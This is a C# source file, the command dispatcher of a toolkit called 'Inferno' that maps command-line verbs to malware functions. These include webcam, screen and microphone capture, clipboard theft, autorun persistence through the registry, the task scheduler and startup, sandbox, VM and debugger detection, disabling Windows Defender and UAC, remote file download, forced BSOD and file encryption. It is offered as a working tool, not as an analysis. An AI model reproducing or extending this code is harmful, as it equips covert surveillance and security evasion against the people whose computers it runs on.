using System;

namespace Inferno
{
    class Program
    {
        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        [STAThreadAttribute]
        static void Main(string[] args)
        {
            /*
             Сlipboard:
               clipboard.Set("123");
               clipboard.Get();
            Spy functions:
               desktop.Screenshot("desktop.jpg");
               webcam.Screenshot("webcam.jpg");
               audio.record("record.wav", 10);
            Evil:
               evil.bsod();
               evil.setWallpaper("file.jpg");
            Activity:
               activity.getWindowTitle();
               activity.getCursorPosition();
               activity.setCursorPosition(200, 200);
               activity.userIsActive();


            Autorun TaskScheduler method:
               autorun.installTaskScheduler("C:\\Windows\\explorer.exe");
               autorun.uninstallTaskScheduler("C:\\Windows\\explorer.exe");
            Autorun Registry method:
               autorun.installRegistry("C:\\Windows\\explorer.exe");
               autorun.uninstallRegistry("C:\\Windows\\explorer.exe");
            Autorun shell:startup method:
               autorun.installShellStartup("C:\\Windows\\explorer.exe");
               autorun.uninstallShellStartup("C:\\Windows\\explorer.exe");

            Sandbox:
               status.inSandboxie();
            VirtualBox:   
                status.inVirtualBox();
            Debugger:
                status.inDebugger();

            Network:
                network.downloadFile("url", "file.txt");

            Bypass:
                bypass.disableDefender();
                bypass.disableUAC();
                bypass.enableUAC();

            Admin:
                admin.isAdministrator();
                admin.startFile("cmd.exe");

            Power:
                power.shutdown();
                power.reboot();
                power.hibernate();
                power.logoff();

            Encryption:
                crypt.EncryptString("string", "key");
                crypt.DecryptString("string", "key");

                crypt.EncryptFile("SECRET.txt", "123");
                crypt.DecryptFile("SECRET.txt.IEnc", "123");


             */

            // Get command line args
            string cmd = "", arg1 = "", arg2 = "", arg3 = "";
            if (args.Length > 0)
            {
                try
                {
                    cmd  = args[0];
                    arg1 = args[1];
                    arg2 = args[2];
                    arg3 = args[3];
                } catch (IndexOutOfRangeException) { }
                
                
            } else
            {
                output.error = true;
                core.Exit("No arguments found", output, 3);
            }
            // Parse
            switch (cmd)
            {
                // Clipboard
                case "CLIPBOARD_SET": // (newClipboardText)
                    {
                        clipboard.Set(arg1);
                        break;
                    }
                case "CLIPBOARD_GET": // (null)
                    {
                        clipboard.Get();
                        break;
                    }
                // Spy
                case "DESKTOP_SCREENSHOT": // (filename)
                    {
                        desktop.Screenshot(arg1);
                        break;
                    }
                case "WEBCAM_SCREENSHOT": // (filename, delay, camera)
                    {
                        webcam.Screenshot(arg1, Int32.Parse(arg2), Int32.Parse(arg3));
                        break;
                    }
                case "MICROPHONE_RECORD": // (filename, seconds)
                    {
                        audio.record(Int32.Parse(arg2), arg1);
                        break;
                    }
                // Evil
                case "BSOD": // (null)
                    {
                        evil.bsod();
                        break;
                    }
                case "WALLPAPER": // (filename)
                    {
                        evil.setWallpaper(arg1);
                        break;
                    }
                // Activity
                case "GET_ACTIVE_WINDOW": // (null)
                    {
                        activity.getWindowTitle();
                        break;
                    }
                case "GET_CURSOR_POSITION": // (null)
                    {
                        activity.getCursorPosition();
                        break;
                    }
                case "SET_CURSOR_POSITION": // (x, y)
                    {
                        activity.setCursorPosition(Int32.Parse(arg1), Int32.Parse(arg2));
                        break;
                    }
                case "USER_IS_ACTIVE": // (null)
                    {
                        activity.userIsActive();
                        break;
                    }
                // Autorun
                case "AUTORUN_INSTALL_TASKSCHEDULER": // (filename)
                    {
                        autorun.installTaskScheduler(arg1);
                        break;
                    }
                case "AUTORUN_UNINSTALL_TASKSCHEDULER": // (filename)
                    {
                        autorun.uninstallTaskScheduler(arg1);
                        break;
                    }
                case "AUTORUN_INSTALL_REGISTRY": // (filename)
                    {
                        autorun.installRegistry(arg1);
                        break;
                    }
                case "AUTORUN_UNINSTALL_REGISTRY": // (filename)
                    {
                        autorun.uninstallRegistry(arg1);
                        break;
                    }
                case "AUTORUN_INSTALL_SHELLSTARTUP": // (filename)
                    {
                        autorun.installShellStartup(arg1);
                        break;
                    }
                case "AUTORUN_UNINSTALL_SHELLSTARTUP": // (filename)
                    {
                        autorun.uninstallShellStartup(arg1);
                        break;
                    }
                // Status
                case "STATUS_IN_SANDBOXIE": // (null)
                    {
                        status.inSandboxie();
                        break;
                    }
                case "STATUS_IN_VIRTUALBOX": // (null)
                    {
                        status.inVirtualBox();
                        break;
                    }
                case "STATUS_IN_DEBUGGER": // (null)
                    {
                        status.inDebugger();
                        break;
                    }
                case "STATUS_IS_ADMIN": // (null)
                    {
                        admin.isAdministrator();
                        break;
                    }
                // Network
                case "NETWORK_DOWNLOAD_FILE": // (url, filename)
                    {
                        network.downloadFile(arg1, arg2);
                        break;
                    }
                // Bypass
                case "BYPASS_DISABLE_DEFENDER": // (null)
                    {
                        bypass.disableDefender();
                        break;
                    }
                case "BYPASS_ENABLE_UAC": // (null)
                    {
                        bypass.enableUAC();
                        break;
                    }
                case "BYPASS_DISABLE_UAC": // (null)
                    {
                        bypass.disableUAC();
                        break;
                    }
                case "ADMIN_STARTFILE": // (filename)
                    {
                        admin.startFile(arg1);
                        break;
                    }
                // Power
                case "POWER_SHUTDOWN": // (null)
                    {
                        power.shutdown();
                        break;
                    }
                case "POWER_REBOOT": // (null)
                    {
                        power.reboot();
                        break;
                    }
                case "POWER_HIBERNATE": // (null)
                    {
                        power.hibernate();
                        break;
                    }
                case "POWER_LOGOFF": // (null)
                    {
                        power.logoff();
                        break;
                    }
                // Encryption
                case "FILE_ENCRYPT": // (filename, key)
                    {
                        crypt.EncryptFile(arg1, arg2);
                        break;
                    }
                case "FILE_DECRYPT": // (filename, key)
                    {
                        crypt.DecryptFile(arg1, arg2);
                        break;
                    }
                // Default value
                default: {
                        core.Exit("Command '" + cmd + "' not found!", output, 3);
                        break;
                    }
            }
        }
    }
}
